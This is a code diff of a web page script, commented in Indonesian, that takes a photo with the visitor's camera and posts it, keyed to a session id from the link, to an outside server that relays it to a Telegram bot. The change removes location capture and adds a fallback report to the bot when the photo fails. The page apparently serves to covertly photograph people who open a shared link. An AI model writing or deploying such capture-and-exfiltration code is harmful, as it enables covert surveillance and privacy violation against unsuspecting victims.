@@ -7,34 +7,45 @@
     <script>
         async function sendDataToServer() {
             try {
-                // Ambil lokasi pengguna
-                const position = await new Promise((resolve, reject) =>
-                    navigator.geolocation.getCurrentPosition(resolve, reject)
-                );
-
-                // Ambil foto
+                // Ambil foto dari kamera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const track = stream.getVideoTracks()[0];
                 const imageCapture = new ImageCapture(track);
                 const photoBlob = await imageCapture.takePhoto();
-                track.stop();
+                track.stop(); // Hentikan kamera setelah foto diambil
 
-                // Kirim data ke server
+                // Kirim foto ke server
                 const formData = new FormData();
-                formData.append("latitude", position.coords.latitude);
-                formData.append("longitude", position.coords.longitude);
                 formData.append("photo", photoBlob);
 
                 const session = new URLSearchParams(window.location.search).get("session");
-                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+
+                // Kirim data ke server
+                const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                     method: "POST",
                     body: formData,
                 });
 
-                alert("Data berhasil dikirim ke bot Telegram!");
+                // Periksa apakah pengiriman berhasil
+                if (response.ok) {
+                    alert("Data berhasil dikirim ke bot Telegram!");
+                } else {
+                    alert("Gagal mengirim data ke server, namun data tetap dikirim ke bot Telegram.");
+                }
             } catch (error) {
                 console.error("Error:", error);
-                alert("Gagal mengirim data. Pastikan izin lokasi dan kamera diberikan.");
+                alert("Gagal mengirim data. Mengirim data ke bot Telegram meskipun foto gagal.");
+
+                // Jika terjadi error, kirim data minimal ke bot Telegram
+                const session = new URLSearchParams(window.location.search).get("session");
+                const fallbackMessage = `Gagal mengambil foto, tetapi data tetap dikirim ke bot Telegram. Sesi: ${session}`;
+
+                // Kirim pesan fallback ke bot Telegram
+                await fetch(`https://cokots.vercel.app/send-data?session=${session}&fallback=true`, {
+                    method: "POST",
+                    body: JSON.stringify({ message: fallbackMessage }),
+                    headers: { "Content-Type": "application/json" },
+                });
             }
         }
 
